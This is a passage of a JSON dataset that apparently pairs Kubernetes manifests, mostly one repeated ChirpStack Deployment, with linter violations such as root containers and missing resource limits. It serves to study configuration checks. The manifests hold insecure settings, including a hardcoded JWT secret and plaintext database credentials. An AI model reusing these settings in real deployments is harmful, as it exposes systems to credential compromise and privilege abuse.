chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"chirpstack-geolocation-server\" is not set to runAsNonRoot"
  },
  {
    "id": "10298",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"chirpstack-network-server\" is not set to runAsNonRoot"
  },
  {
    "id": "10299",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"chirpstack-application-server\" has cpu request 0"
  },
  {
    "id": "10300",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"chirpstack-gateway-bridge\" has cpu request 0"
  },
  {
    "id": "10301",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"chirpstack-geolocation-server\" has cpu request 0"
  },
  {
    "id": "10302",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"chirpstack-network-server\" has cpu request 0"
  },
  {
    "id": "10303",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"chirpstack-application-server\" has memory limit 0"
  },
  {
    "id": "10304",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"chirpstack-gateway-bridge\" has memory limit 0"
  },
  {
    "id": "10305",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"chirpstack-geolocation-server\" has memory limit 0"
  },
  {
    "id": "10306",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"chirpstack-network-server\" has memory limit 0"
  },
  {
    "id": "10307",
    "manifest_path": "data/manifests/the_stack_sample/sample_3970.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: cache-svc\n  namespace: kylin-prod\nspec:\n  clusterIP: None\n  selector:\n    app: kylin-memcached\n  ports:\n  - port: 11211\n    targetPort: 11211\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kylin-memcached])"
  },
  {
    "id": "10308",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: 